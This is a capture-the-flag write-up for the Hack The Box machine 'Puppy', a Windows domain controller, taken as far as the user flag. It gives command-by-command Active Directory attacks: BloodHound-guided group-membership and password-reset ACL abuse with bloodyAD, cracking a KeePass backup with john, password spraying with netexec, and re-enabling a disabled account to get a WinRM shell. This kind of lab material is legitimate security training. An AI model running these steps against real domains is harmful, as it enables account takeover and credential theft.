## Overview

Puppy is a medium-difficulty Windows box and a Domain Controller for `PUPPY.HTB`. The engagement is assumed-breach: we start with low-privilege credentials for `levi.james`. BloodHound reveals that levi's `HR` group has `GenericWrite` over the `DEVELOPERS` group ŌĆö enough to add levi to that group and unlock a restricted `DEV` SMB share. The share holds a KeePass backup whose weak master password cracks to a vault of credentials that are reused across the domain. Spraying lands `ant.edwards`, who holds `GenericAll` over the disabled `adam.silver` account; resetting its password and clearing the disabled flag gives a WinRM shell and the user flag. This post covers recon through user.txt.

Realistic BloodHound ACL-abuse chain (GenericWrite/GenericAll, KeePass crack, password reuse, re-enabling a disabled account) with no CVE and only point-and-click bloodyAD tooling.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS | domain controller |
| 88/tcp | Kerberos | DC for PUPPY.HTB |
| 135/tcp | RPC | |
| 139/445/tcp | SMB | non-default DEV share |
| 389/636/tcp | LDAP/LDAPS | |
| 5985/tcp | WinRM | foothold protocol |

```bash
nmap -Pn -A -v 10.10.10.X
```

The scan fingerprints a Domain Controller: Kerberos, LDAP, SMB and DNS all answer, and the domain is `PUPPY.HTB`. Add the host so name-based tooling and Kerberos work.

```bash
echo '10.10.10.X dc.puppy.htb puppy.htb' | sudo tee -a /etc/hosts
sudo ntpdate dc.puppy.htb
```

## Enumeration

With the provided `levi.james` credentials, enumerate shares and collect BloodHound data.

```bash
netexec smb puppy.htb -u levi.james -p '<pass>' --shares
```

There is a non-default `DEV` share, but levi has no read access to it yet. Pull the graph to understand why and what levi can abuse.

```bash
bloodhound.py -u levi.james -p '<pass>' -ns 10.10.10.X -d puppy.htb -c all --zip
```

BloodHound surfaces the key edge: levi's `HR` group holds **`GenericWrite`** over the `DEVELOPERS` group. `GenericWrite` on a group object implicitly grants the right to edit its `member` attribute ŌĆö so levi can add himself. Membership of `DEVELOPERS` is exactly what gates read access to the `DEV` share.

While here, dump the domain user list for the spray later.

```bash
netexec smb puppy.htb -u levi.james -p '<pass>' --rid-brute | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee usernames.txt
```

## Foothold

**1 ŌĆö Abuse GenericWrite to read the DEV share.** Add levi to `DEVELOPERS`, then re-check shares ŌĆö `DEV` is now readable.

```bash
bloodyAD --host 10.10.10.X -d puppy.htb -u levi.james -p '<pass>' add groupMember "DEVELOPERS" "levi.james"
netexec smb puppy.htb -u levi.james -p '<pass>' --shares
```

The share holds a KeePass database backup. Download it.

```bash
smbclient //puppy.htb/DEV -U levi.james -c "get recovery.kdbx"
```

**2 ŌĆö Crack the KeePass master password.** Extract the hash and crack offline. The `.kdbx` is format 4, so an up-to-date john build is needed (the snap package works if the distro package errors with `File version '40000' not supported`).

```bash
keepass2john recovery.kdbx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=KeePass hash.txt
```

The master password is `liverpool` ŌĆö straight out of `rockyou.txt`. Export the vault to CSV and pull every password into a spray list.

```bash
echo 'liverpool' | keepassxc-cli export -f csv recovery.kdbx > output.csv
grep -oP '(?<=,")[^"]*2025![^"]*' output.csv | sort -u > passwords.txt
```

**3 ŌĆö Spray the reused passwords.** The KeePass entries reuse their passwords as the actual domain passwords. Spray the vault against the user list.

```bash
netexec smb puppy.htb -u usernames.txt -p passwords.txt --continue-on-success
```

`Antman2025!` is valid for `ant.edwards`.

**4 ŌĆö GenericAll over a disabled account.** BloodHound shows `ant.edwards` (via `SENIOR DEVS`) holds `GenericAll` over `adam.silver`. `GenericAll` includes `User-Force-Change-Password`, so we reset adam's password without knowing the old one.

```bash
bloodyAD --host 10.10.10.X -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' '<newpass>'
```

A login attempt returns `STATUS_ACCOUNT_DISABLED` ŌĆö the account is disabled. The same `GenericAll` also lets us clear the `ACCOUNTDISABLE` UAC flag.

```bash
bloodyAD --host 10.10.10.X -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE
```

## User flag

With adam.silver re-enabled and its password reset, WinRM in and grab the flag.

```bash
evil-winrm -i puppy.htb -u adam.silver -p '<newpass>'
```

```powershell
type C:\Users\adam.silver\Desktop\user.txt
# [redacted]
```

A WinRM shell as `adam.silver` and the user flag are ours.

Lateral movement and privilege escalation are left as an exercise ŌĆö this post stops at user.
